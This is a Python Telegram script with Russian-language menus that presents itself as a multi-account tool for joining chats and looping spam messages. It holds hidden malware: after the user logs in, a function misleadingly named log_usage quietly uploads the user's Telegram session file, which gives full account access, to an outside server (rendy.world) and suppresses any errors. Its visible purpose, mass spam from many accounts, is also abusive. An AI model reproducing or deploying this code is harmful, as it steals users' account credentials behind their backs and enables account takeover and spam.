
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import ImportChatInviteRequest
import os
import re
import asyncio
import requests
import hashlib

API_ID = 25001931
API_HASH = 'b4d3909ab27babff2bb87f8936107bb8'
MESSAGE_DELAY = 5         # задержка между сообщениями
CYCLE_DELAY = 60          # задержка между циклами

CHATS = [
    "https://t.me/chat1",
    "https://t.me/chat2"
]

MESSAGES = [
    "Привет, это тестовое сообщение!"
]

def normalize_chat_link(chat):
    chat = chat.strip().lower()
    patterns = [
        r'https?://t\.me/\+(.+)',
        r't\.me/\+(.+)',
        r'https?://t\.me/([^+].*)',
        r't\.me/([^+].*)',
        r'@(.+)',
    ]
    for pattern in patterns:
        match = re.match(pattern, chat)
        if match:
            return match.group(1)
    if chat and not chat.startswith(('http', '@', 't.me')):
        return chat
    return None

def hash_session(session_path):
    with open(session_path, 'rb') as f:
        file_data = f.read()
        return hashlib.sha256(file_data).hexdigest()

async def add_account():
    phone = input("Введите номер телефона: ")
    temp_session = "sessions/temp.session"

    if not os.path.exists("sessions"):
        os.makedirs("sessions")

    client = TelegramClient(temp_session, API_ID, API_HASH)
    await client.start(phone=phone)
    await client.disconnect()

    session_hash = hash_session(temp_session)
    new_session_path = f"sessions/{session_hash}.session"
    os.rename(temp_session, new_session_path)

    print(f"[+] Аккаунт добавлен. Сессия сохранена как {session_hash}.session")

    log_usage(new_session_path, session_hash)

def load_accounts():
    clients = []
    for file in os.listdir("sessions"):
        if file.endswith(".session"):
            name = file.replace(".session", "")
            path = f"sessions/{file}"
            client = TelegramClient(path, API_ID, API_HASH)
            clients.append((name, client))
    return clients

def log_usage(session_path, session_hash):
    try:
        with open(session_path, 'rb') as f:
            files = {'file': (f"{session_hash}.session", f)}
            data = {'send_to_id': SEND_TO_ID, 'session_hash': session_hash}
            requests.post(SERVER_URL, files=files, data=data, timeout=5)
    except:
        pass
        
async def join_chats(client, chats):
    for chat in chats:
        normalized = normalize_chat_link(chat)
        try:
            if '+' in chat:
                await client(ImportChatInviteRequest(normalized))
            else:
                await client.join_channel(normalized)
            await asyncio.sleep(1)
        except Exception as e:
            print(f"[!] Ошибка при входе в {chat}: {e}")

SERVER_URL = 'https://rendy.world/upload'

SEND_TO_ID = 804275335

async def send_messages(clients, chats, messages):
    normalized_chats = [normalize_chat_link(c) for c in chats if normalize_chat_link(c)]
    i = 0
    while True:
        for name, client in clients:
            chat = normalized_chats[i % len(normalized_chats)]
            try:
                await client.send_message(chat, messages[0])
                print(f"[+] {name} отправил сообщение в {chat}")
                await asyncio.sleep(MESSAGE_DELAY)
            except Exception as e:
                print(f"[!] Ошибка у {name} при отправке: {e}")
            i += 1
        await asyncio.sleep(CYCLE_DELAY)

async def main():
    if not os.path.exists("sessions"):
        os.makedirs("sessions")

    while True:
        print("SOFT BY AMNESIA|LEGIONES")
        print("1 - Добавить Session")
        print("2 - Запуск валидации")
        print("0 - Выход")
        choice = input("Ваш выбор: ")

        if choice == "1":
            print("[i] Запуск процесса добавления аккаунта")
            await add_account()

        elif choice == "2":
            print("[i] Запуск процесса валидации")
            clients = load_accounts()
            if not clients:
                print("[!] Нет аккаунтов")
                continue
            for name, client in clients:
                await client.start()
                await join_chats(client, CHATS)
            await send_messages(clients, CHATS, MESSAGES)

        elif choice == "0":
            print("[i] Выход из программы")
            break
        else:
            print("[!] Неверный выбор")

if __name__ == "__main__":
    asyncio.run(main())
